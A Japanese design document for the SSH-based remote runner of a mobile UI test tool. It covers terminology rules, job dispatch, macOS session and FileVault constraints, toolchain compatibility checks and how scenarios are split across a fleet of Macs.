# リモートランナー構想

2026-07-30 の検討結果の文書化。**Phase 1(`run --runner` / `api run --runner` と GUI の
ホスト登録・実行先選択)は実装済み(§12)。§14 の導入コマンド一式(`preflight.sh --runner` /
`remote setup` / 汎用転送 `remote exec`)も実装済み(2026-08-16)。**§13 は段1〜段4が実装済み**
(段5 の残りは健全性 watchdog の分界だけ。ブリッジ watchdog は 2026-09-25 に分界済み)、**§16 の運用コマンド(16.1〜16.5)と §18 の共有
(FIFO 待機列・占有の配布・1マシン1 run)も実装済み**。
**別マシン(M1Ultra)への導入とシナリオ1本の実走まで実機で確認済み(2026-08-16。§14 末尾に実測と罠)**。
**利用者向けの手順書は [remote-runner-setup.md](remote-runner-setup.md)**(この文書は設計の記録)。
**SSH 越しの実 E2E は localhost で実施済み(2026-07-31。§9 実験①)** — 到達経路が確定し、
`asuser` は撤去した(root 必須で実用不可)。実2台での検証は未実施。
**セキュリティ前提と信頼モデルは §15** — 実装前に必ず読むこと。

## 0. 用語(2026-08-26 ユーザー決定。**この文書と実装の全体でこの定義に従う**)

| 語 | 意味 | 書く場所 | 鍵にしてよいか |
|---|---|---|---|
| **host** | **ホスト名 または IP アドレス**(`user@host` の形も含む。ネットワーク上の実体) | ホスト登録簿の `host`、`--runner`、ssh 宛先 | **よい**(安定した識別子) |
| **machine** | その host に対する**ローカルエイリアス**。このマシンの登録簿だけが知っている名前 | ホスト登録簿の `machine`、プロファイルの `machine`、`--runner` | **原則だめ** —— 頻繁に変わりうるので記録の鍵に使わない。**例外はその machine 自身に関する構成**(登録簿・プロファイルのデバイス割り当て) |

守る規律は4つ:

1. **エイリアスをリモートへ出さない**。転送するプロファイルは `FTCore.RunnerProfileView` が
   「そのランナーから見た姿」へ畳む(そのランナーのデバイスは `machine: "local"`・他機のデバイスは削除)。
   子へ渡すのも `--device-machine local` 固定で、`M1Ultra` 等はランナーのディスクにも引数にも出ない
2. **記録の鍵は host**。`run.json` / `scenarios/*.json` は `host`(ホスト名)を書き、LPT の
   「同じ機械の実績を優先」もこれで照合する。`.fleetest/remote-hosts/<ホスト>.json` も同じ
3. **プロファイルに ssh 実体を書かない**(従来どおり)。プロファイルはプロジェクト資産なので、
   書けるのは `machine`(エイリアス)だけ。`host` はローカル設定(`LocalConfig.remoteHosts`)にだけ置く
4. **手元の台帳(実行プロファイルの `devices`)を「ランナーの視点」で書かない** —— **発行側から
   見た姿**で書き、他機のデバイスには必ず `machine: "<マシン名>"` を書く。ランナーへ渡す姿(`"local"`)は
   転送時に `RunnerProfileView` が畳むので、手で `"local"` と書いてはいけない。
   書くと2つ壊れる: **①ディスパッチが手元へ落ちる**(`fleetest run` は「デバイスが居る機械」で
   宛先を決めるので、向こうのデバイスを手元で探して `no simulator with that UDID`)/
   **②実行プロファイル未選択の監視で、実在する手元のデバイスが消える** —— 台帳を畳む
   `MachineInventory` は (platform, machine, name) の重複を1件にするので、手元に**実在しない**
   udid のほうが (ios, local, 同名) を先に埋めると、本物の起動中シミュレータが「未登録の
   起動中デバイス」として合成され **id 衝突で毎周期落ちる**(実害 2026-09-03。症状は
   `[monitor] Skipped an unregistered simulator due to an id collision: …` が鳴り続け、
   そのデバイスのタイルが offline のまま)。実体(udid/avd/serial)の食い違いは
   `MachineInventory.merge` が警告し、`MachineInventoryTests` がこのリポジトリの台帳全数に当てる

**JSON キーの改名(2026-08-26)**: プロファイルの `devices[].host` → `machine`、マシンプロファイル
直下の `host` → `machine`、ホスト登録簿の `name` → `machine`、記録の `machine` → `host`。
**旧キーはプロファイルの `devices[].host` を除いて読める**(`devices[].host` は読まない = 書くと
手元のデバイスとして扱われる。書き出しは新キーのみ)。

**拡張 ⇄ webview のメッセージも同じ日に揃えた**(こちらは同時に配布されるので旧キーは読まない):
`remoteConfig.hosts[].machine`・`DeviceCommandSource.machine`・`machineProfileInfo` の
`machines[].machine` / `devices[].machine`・`deviceOp`/`deviceOpBusy`/`deviceDownFinished` の
`machine`・`machineDeviceRemove.devices[].machine`・`machineDeviceUpdate.deviceMachine`
(同じ階層の `machine` = マシンプロファイル名と衝突するため別名)・`runProfileSave` の
`fields.devices[].machine`。**片側だけ改名すると黙って壊れる** —— 実際、webview が `host` を
送り拡張が `machine` を読む状態が数時間残り、実行プロファイルのリモート参照が
`machine: "local"` に書き換わった。

**CLI ⇄ 拡張のワイヤも揃えた(ProtocolVersion 9)**: `api monitor` の `machineHost` → `machine`、
`api start-all-devices` のライフサイクル行の `host` → `machine`、`api remote-compat` の
`hosts[].name` → `machines[].machine`(`sshTarget` は本物のホストなのでそのまま)。
**旧キーは読まない** —— この3つは拡張だけが読む口で、版が合っていなければ拡張が起動時に警告する。

**Swift 側の識別子も同時に揃えた**(挙動は不変): `DeviceHostGrouping` → `DeviceMachineGrouping`
(ファイルごと)・`RunDeviceHost` → `RunDeviceMachine`・`DeviceHostRunner` → `DeviceMachineRunner`・
`ApiRunHostFanout` → `ApiRunMachineFanout`・`MachineHostDispatch` → `MachineDispatch`
(`Decision.host` → `.target` = マシン名か `--runner` の生の宛先)・`deviceHost` → `deviceMachine`。
**`host` を残したのは本物のホストだけ**(登録簿の ssh 宛先・ブリッジの宛先 IP・`RemoteHostFacts` の
鍵・fleet 定義の `runs[].host`)。

## 1. 前提と目的

- **マシンは Mac に統一**(ユーザー決定 2026-07-30。クライアント・実行側とも)。
  非 Mac クライアントからの実行という要件は存在しない
- CI は self-hosted Jenkins / EC2 Mac([ci.md](ci.md))。**ジョブ粒度のリモート実行は
  CI が既に担っている**ため、本構想の固有価値は CI を経由しない対話的用途に限られる:
  1. **Mac フリートへのシナリオ並列分散**(夜間回帰のスループット。FM はホスト単位で
     許可枠に制限される共有資源(performance-tuning.md §3.5)のため、1台に集約すると枠で
     頭打ちになる。台数分に分散すれば機械ごとに別の枠が使え、screenLooksLike 多用スイートは
     台数分の実質短縮になる)
  2. **デバイス/実機ラボの共有**(iOS 実機は元々 LAN/iproxy の2択で相性は悪くない)
- 着手判断の鍵は**上記需要が実在するか**。Phase 0 で確かめてから実装に進む

## 2. 却下済みの代替案(再提案しない)

| 案 | 内容 | 却下理由 |
|---|---|---|
| A. ブリッジ層で切る | `BridgeClient` の HTTP を遠隔ホストへ向ける | ステップ毎 snapshot の chatty なプロトコルに LAN RTT が乗り、ms 級チューニング(stale-guard 350ms・LPT 等)が崩れる。プロビジョニング(ブート・ランナービルド・インストール・ゾンビ掃除・凍結復旧)は全部ローカルプロセス制御前提で、遠隔化には常駐エージェント=第二プロダクトが要る |
| B. 独自プロトコルの常駐デーモン | fleetestd を立ててクライアントが接続 | 全マシン Mac なのでどのマシンもフルスタックが動き、役割分離の動機が無い。ジョブ粒度なら Jenkins の再発明。認証/TLS の自前実装が必要 |
| FM 分離構成 | デバイスは VM ファーム・FM は手元物理 Mac(案A の副産物) | 全 Mac(物理)前提で動機消滅 |

## 3. 採用方針: ジョブ(run)単位の SSH ディスパッチ

**対等ピアモデル**。どの Mac も clone + `Scripts/install.sh` で同一状態になれるので、
リモート実行=「向こうの Mac で普通にローカル実行し、結果を手元へストリームする」だけにする。
新プロトコル・認証・常駐デーモンは作らない(トランスポートは SSH)。

`fleetest run --runner <mac>` の流れ(**当初設計**。実装済みの Phase 1 は clone 構成・
アプリ非転送・`project sync` 経由など意図的な逸脱を含む — **現状の正は §12**):

1. 適合チェック(§7。不一致は fail fast)
2. 転送(rsync: シナリオ・プロファイル)。**リモートは外部構成(WORK_DIR 分離)前提・
   rsync 先はリモートの WORK_DIR**(実装は §18.2 の `<base>/users/<issuer>/work`)。
   **相手のローカルインストールと同じ場所に置かない** — `--delete` が相手の資産を消し、
   クローン共用は SPM ビルドロック競合を起こす(§12 の実害3件)
3. リモートで `install.sh`(冪等)→ 実行。転送後はリモートで scenario ターゲットの
   swift build が走る(コールドは数分。`clean -fd` に `-x` を付けない= .build 温存の
   既存設計が増分ビルドを効かせる)
4. **ストリームバックの実体は用途で分ける**: CLI/CI は `fleetest run --quiet --junit` の
   出力中継、拡張(レーン表示)連携は `fleetest api run` の NDJSON 中継
   (`fleetest run` は人間向け出力で NDJSON を喋らない。ApiRunCommand が唯一の機械可読契約)
5. 成果物回収(reports/・JUnit・results DB・録画)。**JUnit 内 `report:` 行は
   リモートの絶対パス**なので回収後のローカルパスへ書き換える。
   回収物は**リモートが生成した外部入力**として扱う(§15)

**禁止事項(実装者向け・摩擦が出ても回避しない)**:

- **`StrictHostKeyChecking` を無効化しない**(`-o StrictHostKeyChecking=no` を足さない)。
  ホスト鍵検証は MITM に対する唯一の防御であり、同時に「設定の乗っ取りで未知ホストへ
  ディスパッチされる」経路を実際に塞いでいる(§15)。初回接続の TOFU は
  `ssh-copy-id` の手動ステップ(§14 ステップ0)で人間が1回だけ行う
- **`--remote-dir` を実行ごとの自由入力にしない**。転送は `--delete` 付きでリモートの
  ディレクトリを上書きするため、宛先は**登録簿(§13)に登録された値のみ**を使う

**ホスト混在プロファイル(devices に `host: "local"` と `host: "M1Max"` 等が並ぶ形)を
`--runner <名前>` で単一ホストへ送るときは、そのホスト担当のデバイスだけが
`--device`/`--device-machine` として自動で付く**(丸ごと送ると受け側の「local」枠が発行元の
Mac のデバイスに解決され、存在しないデバイスの起動を試みるため)。担当が1台も無いプロファイルは
ディスパッチ前にエラーで止まる。

## 4. 全体アーキテクチャ

```
┌─ ローカル Mac(発行側)────────────────────────────┐
│ fleetest run --runner mac2 --profile …              │
│  ├─ 適合チェック(rev / Toolchain / Protocol)     │
│  ├─ 転送(rsync: シナリオ・プロファイル・アプリ)  │
│  ├─ NDJSON 受信 → 進捗表示・拡張へ中継            │
│  └─ 成果物回収(reports/ ・junit.xml・results DB) │
└───────────────┬────────────────────────────────────┘
                │ SSH
┌───────────────▼─ リモート Mac(実行側)────────────┐
│ Background セッション(sshd 側)= control plane    │
│  └─ ジョブを session agent へ引き渡すだけ          │
│ Aqua セッション(§5 の2モード+LaunchAgent)       │
│  └─ session agent が fleetest run を spawn           │
│      = execution plane(シミュレータ・XCUITest・FM)│
└────────────────────────────────────────────────────┘
```

## 5. control plane / execution plane 分離(GUI セッション制約への回答)

GUI 依存は fleetest のコードではなく **macOS のセッション意味論**に由来する
(launchd のセッション種別が Background[SSH 直・LaunchDaemon]か Aqua かで
WindowServer・ユーザー空間サービスへのアクセスが変わる。
「ログインなしで Aqua を作る」公式手段は macOS に無い)。よってコード分離では消せず、
**Aqua に置くものを最小化する**のが唯一の現実解。

| コンポーネント | Aqua 必須? | 備考 |
|---|---|---|
| iOS シミュレータ + XCUITest | 実質必須 | レンダリング・スクリーンショット・XCUITest が Background で不安定(既知問題)。本ツールはスナップショット・録画多用で回避不能 |
| FM(FTFoundationModels) | おそらく必要(未検証) | Apple Intelligence のデーモン群はユーザーセッション側。§9 で実測 |
| Android エミュレータ | 不要にできる可能性 | `-no-window` + swiftshader が定番。ただし §6 の検証が条件 |
| コンパイル・オーケストレーション・results・update | 不要 | 純粋にプロセスとファイル |

- **execution plane = session agent(LaunchAgent)**。責務は「ジョブを受けて
  `fleetest run` を spawn し出力を中継する」だけに限定する。判断・プロビジョニングは
  fleetest 本体に残す(CLAUDE.md「機械作業はスクリプト/CLI へ」と同じ方針)。
  加えて**ジョブは直列化(1本ずつ)** — 同一リモートへの同時ディスパッチは
  デバイス割当が競合する(単一マシンには無かった失敗モード)。並行受付は
  Phase 3 の分散スケジューリング側の課題として送る。
  **直列化が入るまでの残穴**: フリート内の実行先重複拒否(§13)は
  **別フリート・別人・CLI/GUI 併走**による同一リモートへの二重実行を防げない。
  Phase 2 まで、同一リモートへの二重実行は運用で避ける(ローカル+リモートの併走は問題ない)
### 運用前提(Aqua セッションの寿命と2モード)

**自動ログインを無条件必須にはしない**(モード B 限定の選択肢。下記)。macOS は
FileVault 有効時に自動ログインを無効化するため、「自動ログイン必須」はランナー機の
FileVault を捨てることと同義になる。ランナーには SSH 鍵・ソース・シナリオ(テスト資格情報を
含み得る)・録画が載るので、既定は FileVault 有効(モード A)とし、
**Aqua セッションの寿命**に着目して要件を組み直す:

| 事象 | Aqua セッションへの影響 | 対処 |
|---|---|---|
| 画面ロック | **消えない**(セッションは生きたまま) | ロックは**有効のままでよい**(§9 で XCUITest/録画の可否を実測) |
| ディスプレイスリープ | 消えない | 可 |
| **システムスリープ** | 実質停止 | `pmset` で**無効必須**(`sudo pmset -a sleep 0`) |
| **再起動・電源断** | **消える**(loginwindow で停止) | 人が1回ログインして復帰(下記) |

つまり**セッションを失うのは再起動だけ**で、それ以外は無人で回り続ける。再起動は OS 更新
程度の頻度なので、「再起動のたびに人が1回だけ解錠・ログインする」運用は成立する:

- **計画再起動**: `sudo fdesetup authrestart` で再起動すると、次回起動時の
  FileVault 事前認証をスキップしてボリュームが解錠される(遠隔管理用の標準機構)。
  ただし**解錠 ≠ ログイン**なので、その後に画面共有(またはコンソール)で1回ログインして
  Aqua セッションを立てる。
  **実行は人が対話 ssh(または画面共有)で行う手作業** — ディスパッチ経路は
  `BatchMode=yes` で sudo プロンプトに応答できず、NOPASSWD 設定は攻撃面を広げるので
  作らない(再起動は稀なので手作業に倒す。2026-07-31 決定)
- **不意の電源断**: 事前認証から人手で解錠+ログイン。**画面共有(Screen Sharing)を
  有効にしておく**と手元から実施できる(ステップ0 の必須項目)
- **「ログインしていない」を機械で検出する**: `stat -f%Su /dev/console` がランナー
  ユーザーと一致するかを preflight とディスパッチ前チェックに入れ、不一致なら
  **「ランナーが loginwindow で待機中 — 解錠が必要」と明示して落とす**。入れないと
  シミュレータ側の不可解な失敗として現れて切り分けに時間を溶かす

### サポートする2モード(どちらも正式構成)

再起動後の復帰手段だけが違う。**どちらを採るかはランナー機の設置環境で決める**。

| | モード A: FileVault 有効(既定) | モード B: FileVault 無効 + 自動ログイン |
|---|---|---|
| 再起動後 | 人が1回**解錠+ログイン**(画面共有可) | **ゼロタッチ**で Aqua が立つ |
| 平常時 | 無人 | 無人 |
| 向く設置 | 共用オフィス・持ち出し得る機械 | 施錠されたラボ・EC2 Mac 等の専用機 |
| 受容するリスク | — | 起動できる人がデータに到達。自動ログインは `/etc/kcpassword` にログインパスワードを可逆保存(§15.4) |
| 設定 | `fdesetup` 有効・自動ログインなし | `fdesetup` 無効・`autoLoginUser` 設定 |

- **Apple silicon ではモード B でもディスクは常時暗号化されている**(ハードウェア鍵)。
  FileVault の有無は「起動時に鍵が自動で使えるか/資格情報を要求するか」の差であり、
  「平文で置かれる」わけではない。ただし**その機械を起動できる人はデータに到達できる**
- 画面ロックの扱いは**両モード共通**(ロックはセッションを消さないので有効のままでよい。
  §9 の実測待ち)。システムスリープ無効も共通
- **準備状態の判定は両モード共通で `stat -f%Su /dev/console`**(Aqua セッションが
  立っているか)。モードが変えるのは**失われたときの復帰手段だけ**なので、ディスパッチ側の
  チェックはモードを知る必要がない。モード判定(`fdesetup status` + `autoLoginUser`)は
  **preflight が「復帰手順の案内文」を出し分けるためだけに使う**
  (モード A: 「解錠+ログインが必要」/ モード B: 「自動ログインが効いていない — 設定を確認」)
- **到達経路は「SSH の Background セッションでそのまま実行する」1つだけ**(2026-07-31 実測)。
  コンソールに誰かがログインしていれば、SSH 側のプロセスからでもユーザーの launchd ドメインの
  サービス(CoreSimulator 等)に到達でき、シミュレータ・XCUITest・in-app ブリッジまで動く。
  したがって上表の「Aqua 必須?」は正確には**「Aqua セッションが存在すること」が必須**で、
  実行プロセスがその中にいる必要はない
- **`launchctl asuser` 経由の注入は撤去した(ユーザー決定 2026-07-31)**。`asuser` は **root を
  要求**し(`Could not switch to audit session`)、sudo を作らない方針では使えないため。
  セッションモードの選択肢自体を持たない(`--remote-session` は無い)。**再提案しない**

## 6. Android の SSH 実行(2026-07-31 実測。当初の「ヘッドレスレーン」構想は前提が誤りだった)

**当初の記述は誤りだったので撤回する**: 「`-no-window` を採用するか検討」と書いていたが、
**エミュレータは元から `-no-window` で起動している**(`DeviceBooter.startEmulator` が
`-no-snapshot -no-window -no-boot-anim -no-audio -gpu host` を渡す。プロセスの実体も
`qemu-system-aarch64-headless`)。したがって既知の凍結知見(複数台同時描画がトリガ・
sleep/wake で修復)は**すべてヘッドレス環境で得られたもの**で、「窓あり前提」ではない。
採用条件として挙げていた2項目は**検証済み扱いにする**。

実測(SSH の Background セッションから):

| 項目 | 結果 |
|---|---|
| エミュレータの起動 | ✅ 16秒で起動(`-no-window -gpu host`。**Metal も SSH セッションから使える**) |
| Android シナリオの実行 | ✅ 完走(ディスパッチ経由・exit 0) |
| gRPC 制御(`EmulatorControl.shutdown`) | ✅ 動作(2秒で停止。gRPC ポートは `[::1]` に listen し、同一マシンの SSH セッションから到達できる) |

**残る本当の論点は「Aqua セッションが無い(loginwindow のまま)状態で動くか」**で、これは
§5 のログイン検出(§16.3)が塞いでいる領域。iOS と同様、**Android も「Aqua セッションが
存在すること」を前提にする**(未ログイン状態での検証は未実施)。よって
「Android だけログイン不要のレーンに振り分ける」最適化は**現時点では成立が確認できていない**。

**ディスパッチ前にエミュレータの起動が要る**(iOS はプロファイル実行がブリッジを自動供給するが、
Android は `no running emulator for AVD ...` で失敗する)。`fleetest devices up --profile` を
先に撃つ必要がある — フリート運用では `remote setup`/ディスパッチ側で吸収する余地がある(未実装)

## 7. 版整合・更新

- リモート側も clone + ソースビルド(配布方針どおり)。更新は `Scripts/update.sh` の
  仕組みにそのまま乗せる
- ディスパッチ前の適合チェックは**2項目**: **git revision・ToolchainFingerprint
  (Xcode の版 + iOS Simulator SDK のビルド。**macOS の版は含まない**)**。
  **machineName は照合しない** —— 「送り先が想定の機械か」は ssh の宛先(とホスト鍵)が
  保証するので、リモートの登録名は見ない(`RemoteCompat.verdict`)。
  git revision の不一致は**黙って走らせず fail fast**(このリポジトリの
  「片方だけ変えない」規律をマシン間に広げると、スキューは恒常的なバグ族になるため
  入口で遮断する)。**ToolchainFingerprint だけは仕分けが1段深い**(ユーザー決定): 製品版
  (`Xcode X.Y`)が同じで build 番号だけ違う = ベータの seed 違いはディスパッチを**止めない
  advisory**、製品版が違う(26 vs 27 等)は従来どおり fail-closed。根拠は、リモートへ渡るのが
  TestProjects のソースだけで、fleetest 本体・XCUITest ランナー・in-app dylib は**ランナー機が
  自分の Xcode でビルドする**ため機械的な依存が無く、止める理由が「結果の比較可能性」だけに
  縮むこと(実質的な結合は `appPath` のアプリが手元ビルドのままワークスペース経由でランナーへ
  入る1点だけ)。仕分けは `fleetest api remote-compat` / `fleetest remote status --json` の
  `toolchainAdvisory: String?` が持ち、`toolchainCompatible` は「blocking で止まるか」の意味になる
  (advisory のときも true)
- **ランナーに複数の Xcode が入っているときは、発行側の Xcode に一致するものへディスパッチが
  自動で選ぶ**(ユーザー決定)。選ぶのは **`DEVELOPER_DIR`**(プロセス単位・sudo 不要)——
  **`xcode-select -s` は使わない**: 機械全体に効き sudo が要るので、共有ランナーでは自分の選択が
  他の利用者の run を壊す。候補はランナーの **`/Applications` 直下**の `Xcode*.app` だけ
  (`CFBundleShortVersionString` / `ProductBuildVersion` を読む)。**別の場所に置いた Xcode は
  見つからないので登録簿の pin(`RemoteHostEntry.developerDir`)で指定する**。選択規則
  (この順): ①pin があればそれ ②build 番号まで一致する候補がちょうど1つならそれ ③製品版
  (`Xcode X.Y`)が一致する候補がちょうど1つならそれ ④候補が空(列挙できない・Xcode が無い)なら
  何もしない(従来どおり ambient = `xcode-select -p` の結果)⑤一致0個・複数なら**候補一覧を出して
  ディスパッチを拒否**する(手近な Xcode へ黙って倒さない)。**適合チェック(probe)と実行(run)は
  必ず同じ `DEVELOPER_DIR` の解決を通る** —— 食い違うと「照合した Xcode と違う Xcode で走る」
  沈黙した退行になる。**`remote align`(`Scripts/align.sh`)のビルドも同じ解決を通す**
  (`alignRevisionCommand(developerDir:)`。一致しない・列挙できないときは ambient で、一致しないときは1行警告する)
  —— 通さないとランナーの `xcode-select -p` の結果でビルドし、それがコマンドラインツールだと FoundationModels の
  マクロが無くてビルドが落ちる(M1mini で実測)。**モニター(デバイスの状態・ライブ映像)には効かせない** —— 観測は
  dispatch.lock の外で常時走るので、版の違う simctl を同じ CoreSimulatorService に当てる危険を
  増やさない。効果として、**Xcode の製品版が違うランナーも、その製品版の Xcode さえ入っていれば
  フリートに混ぜられる**(この選択が無ければ製品版違い = 常にディスパッチが止まる)。
  **iOS シミュレータのランタイムは Xcode に付いてこない**(CoreSimulator のランタイムは機械共有)
  ので、選んだ Xcode の製品版に対応するランタイムが無ければ起動できない —— `remote status` の
  RUNTIME 欄が既にこれを警告する。**製品版をまたいでフリートを混ぜると、OCR・FM は OS 付属**
  なので結果が機械で変わりうる(既存の macOS 混在の注意と同じ)。赤の帰属は run.json の
  `toolchain` 欄(docs/results-json.md)で追える
- **照会そのものが失敗したときは理由まで出す**(2026-09-09)。`RemoteCompat.ProbeOutcome` が
  「値が無い」と「なぜ取れなかったか」を別に持ち、ssh の exit status とリモートの出力を
  reasons へ載せる。**照会系は1回だけ引き直す**(待ち時間は置かない) —— ssh の単発失敗は
  そのレーンのシナリオを丸ごと捨てるのに対し、引き直しは ssh 1往復で済む。
  **判定は緩めない**: 2回とも失敗すれば fail-closed のまま非互換で落ちる
- **rev 一致の意味 = 両者が同一 upstream コミットにいること**。ローカルの未コミットの
  ツール変更はリモートに載らない(ツール開発中の変更をリモートで試す用途はスコープ外)
- **照合するのは「rev に包含されないもの」だけ**という原則で3項目が決まる —
  Toolchain(マシンごとの Xcode/SDK)と machineName(リポジトリ管理外のローカル設定)は
  rev では担保されない。**`ProtocolVersion` は照合しない**(リポジトリ管理下なので
  rev 一致に包含される。§12 の結論)
- リモートの **TOOL_ROOT 解決は既存4箇所の規則を再利用**する(preflight.sh / update.sh /
  toolRootResolve.ts / Package.swift 宣言。`toolRootContract.test.mjs` の対象)。
  ディスパッチ用の独自解決を新設しない
- **実行前に版ズレだけを問い合わせる口は `fleetest api remote-compat --project <P> --profile <X>`**
  (JSON。人が読む表は `fleetest remote status`)。拡張はこれで実行プロファイルのリモートホスト
  全部の rev/toolchain 適合を見て、ズレていれば「更新して実行 / キャンセル」をダイアログで聞く
  (**「そのまま実行」は置かない** —— ズレたまま走らせるとリモート担当分は必ず
  checkCompatibility に弾かれ、部分失敗の run にしかならない。align で直せないズレ
  = 未 push・到達不能・製品版の違う toolchain 不一致は実行を止めて理由を出す(ベータ seed 違いの
  toolchain advisory は止めない)。チェック自体を外すのは
  設定 `fleetest.remoteCompatCheck`)。ズレの解消(揃えるだけ)は `fleetest remote align <runner>` —
  `remote setup` の align ステップだけを単独で実行する軽量版(preflight/install は通さない)

  **手元を更新したあと全機を揃えるときは `Scripts/align.sh`**(push → 登録簿の全機へ
  `remote align` を**並列で**投げる → `remote status` の REV が手元の HEAD と一致するまで確かめる)。
  `remote align` は1機ずつしか受け取らないので、素で使うと**人の手では必ず直列になる**
  (2026-09-03/04 に計3回、前の機の出力を読んでから次を送った。うち1回は「並列で」と
  明示された直後)。台数ぶん待ちが伸びるだけの誤りなので、判断の余地を機械へ移してある。
  **汚れた作業ツリーでは何もせずに落ちる** —— ランナーは push 済みのコミットを取りに行く

## 8. マルチマシン分散(**実装済み: 2026-08-16**。`run --fleet --split`)

- ~~`RunOrchestrator` の worker 抽象をマシン跨ぎへ拡張~~ → **拡張せずに済んだ**。
  分散は**ディスパッチの手前**(発行側)で行う: シナリオ一覧をローカルで解決 → LPT で
  エントリへ割り当て → 確定した `--scenario` を各エントリへ渡す。各ホストの中では
  従来どおり `RunOrchestrator` が自分のデバイスへ割り当てるので、**2階層が独立**に働く
  (マシン跨ぎの worker 抽象を作ると、ホスト内のデバイス割当と二重管理になる)
- 見積りは既存の `LPTScheduler`(results の中央値)を再利用する。**新しい実績の仕組みを作らない**
- **platform 適合を守る**(iOS 専用シナリオは iOS を走らせられるエントリへ)。どこにも
  入らないシナリオがあれば**throw して止める** —— 黙って落とすと「走ったつもりで
  走っていない」を作る。エントリの platform は実行プロファイルの devices が直接持つ
  (実行プロファイルはプロジェクト資産なので ssh 無しで解決できる)
- **割り当ては決定的**(同着はシナリオ ID、負荷同着はエントリ順)。前回と同じ割り当てを
  再現できないと flake の切り分けにならない
- **実績が1件も無いとき**は全シナリオが同じ重みになり、LPT は本数の均等割りに退化する。
  このとき重みの絶対値は割り当てに影響しないので、**根拠のある秒数を選ぶ問題自体が無い**
  (テストで「値を変えても同じ割り当て」を固定した)。秒と誤読されないよう推定列は出さない
- `--split` のときだけローカルビルドが要る(一覧の解決)。プレーンな `--fleet` の経路は変えない

**実測(2026-08-16。E2E-iOS 23本 / M1Ultra + M1Max)**: 11 + 12 本に分かれ、
推定 133.4s / 135.7s に対し実測のテスト時間 130.5s / 128.9s(**誤差 2〜5%**)。
壁時計は 2分56秒(1台で23本走らせるとテスト時間だけで約 259s)。
- ~~results DB のマージ~~ は**不要だった**(2026-08-16 実測。集計は results/ を走査する
  ファイルベースで、回収した時点で載る。§13 末尾)。レポート内パスの書き換えは
  実装済み(`RemoteReportLink` = 記録側 / `RemotePathRewrite` = JUnit・NDJSON)。
  **JUnit の集約も実装済み**(2026-08-16。`run --fleet --junit <path>` が1ファイルにまとめる。
  各エントリには一時パスの `--junit` を渡し、完了後に `FTCore.JUnitMerge` で結合する)。
  **読めないエントリを黙って省かない**のが要点 —— 出力が無い/壊れているエントリは
  合成した失敗スイート(`fleet-entry-missing` / `fleet-entry-unreadable`)として結果に残す。
  省くと CI からは「そのホストのぶんは全部通った」に見え、throw して1件も書かないと
  「JUnit が無い」= 設定次第で緑にも見える。**赤いテストが1件あるほうが確実に伝わる**。
  同じスイート名が複数ホストで出るので `hostname` を付け、合計は結合後に数え直す
  (各エントリの外側の合計を信用しない)
- デバイス選定は**実行プロファイルの devices が持つ `machine` で解決**する(devices 自体が
  すでにマシン単位の概念を持つ)

**machine 別見積りとディスパッチ固定費(2026-08-18)**: 機械ごとの速度差(手元と各リモート機で
異なる)とディスパッチ経路の固定費(SSH 接続・転送・増分ビルド)を割り当てに織り込む
(`FleetSplit.MachineContext`)。`RemoteHostFactsStore`(`.fleetest/remote-hosts/<host>.json`)は
machine 識別子・実測固定費に加え **CPU モデル・論理コア数・直近 run の同時起動デバイス数**も
持つ。CPU 情報はディスパッチの到達性プローブ(`RemoteRunDispatcher.resolveLayout`)に相乗りした
`sysctl` の実測、machine とデバイス数は回収した実績レコード(`machine`/`worker`)由来 ——
書き手が違う(前者はプローブ、後者はレコード)ので、片方だけ取れなかったときも他方は上書きで
消さない。ローカル機の facts も同じ鍵("local")で `FleetRunner.buildMachineContext` /
`DeviceMachineRunner.assign` が毎回書く(こちらは SSH プローブを経由しないので `MachineHardware.current()`
を直接使う)。

見積りは**同一機の実績 > 混合中央値 × 速度係数(共通観測シナリオの比の中央値)>
コア数の逆比(ローカル基準の事前係数)> 1.0** の順で決める。実績の無い機械には、
共通観測が貯まるまでの間 `entryFallbackFactors`(ローカルのコア数 ÷ 相手のコア数)を暫定係数として
使う ―― 観測が増えて速度係数が求まり次第、そちらへ自然に置き換わる(FleetSplit の優先順が
決める。facts に coreCount が無ければ 1.0 = 従来どおり均等)。**初回(キャッシュ無し)は
従来と同一の混合見積り**に退化する —— facts が無いエントリは machine=nil・offset=0・factor=1.0
として扱われる。**実績が1件も無い run は ms の固定費だけを落とす**(見積りが単位重みへ
退化するので、ms の固定費を同じ比較に載せると単位重みを支配してしまう)が、**コア数の逆比の
係数は効いたまま**にする(単位重み自体に掛かる比率なので単位を汚さない。
`FleetSplit.machineContext(_:ifHistoryExists:)` が offsets だけ 0 化して返す)。
**見積りはそのエントリが実際に回す platform の実績だけで作る(2026-08-24)**。同じ scenarioID を
ios と android の両方で走らせるプロジェクトでは、機械別の実績が片 platform に偏る —— ある機械が
直近 android でしか回していなければ、その機械の中央値は android のものになる。全 platform の
max を採ると、それが「同一機の実績」として ios の run へ入り、**速い platform の値で遅い
platform を見積もって、一番遅く終わる機械に最も多く配る**。実データ(受け手の iOS 98 本・3機・
18 レーン)では M1Ultra だけが android 由来の見積りを 9 本ぶん掴み、レーン当たり実績 552 秒に
対して推定 448 秒(−19%)で最後まで走る極になっていた(local +1% / M1Max +8%)。scope を掛けると
同じ入力で −7% まで縮む。**両 platform を回すエントリでは scope が両方 = 従来の max と同一**
なので、狭まるのは「そちらの platform を回せないエントリ」だけ。速度係数(`speedFactors`)も
**比の分子と分母を同じ platform で取る** —— platform を潰して割ると、速度差ではなく platform 差を
係数として掛けることになる。

ディスパッチのログは推定に続けて**その推定が何に基づいたか**を出す(`FleetSplit.EstimateBasis`。
`local: 43 scenario(s) on 8 device(s) [est. 485s; 36 from <machine> history, 7 scaled x1.00 (measured)]`)。
`--split` の割り当て表は BASIS 列。係数だけでは由来が分からず、遅い機に偏った run を後から
検証できない(2026-08-24 受け手要望)。

実行後の集計表には **IDLE 列**(そのエントリの最長 duration との差)を追加した —
静的割り当ての偏り(ストラグラー)を再配分機構を作る前に実測で貯めるためで、割り当てそのものは
まだ実行後にフィードバックしない。効果の実測(3機械12台での収束データと、初回 run を効果の
基線にしない理由)は docs/performance-tuning.md §3.7 の 7。

## 9. 未検証事項(実装前に潰す)

### 実験①の結果(2026-07-31 localhost E2E で実測・確定)

| 項目 | 結果 |
|---|---|
| **`launchctl asuser` で Aqua へ注入できるか** | ❌ **不成立**。`Could not switch to audit session: Operation not permitted` — **asuser は root を要求する**。sudo/NOPASSWD を作らない方針(§5)なので**実用不可 → 撤去**(ユーザー決定) |
| **SSH の Background セッションで直に実行** | ✅ **成立**。シミュレータ起動・アプリインストール・**XCUITest ブリッジ・in-app ブリッジ・シナリオ実行**まで通った(これが唯一の経路になった) |
| ディスパッチの体験(転送→実行→中継→回収) | ✅ 成立。JUnit・Markdown レポートともローカルへ回収できた |
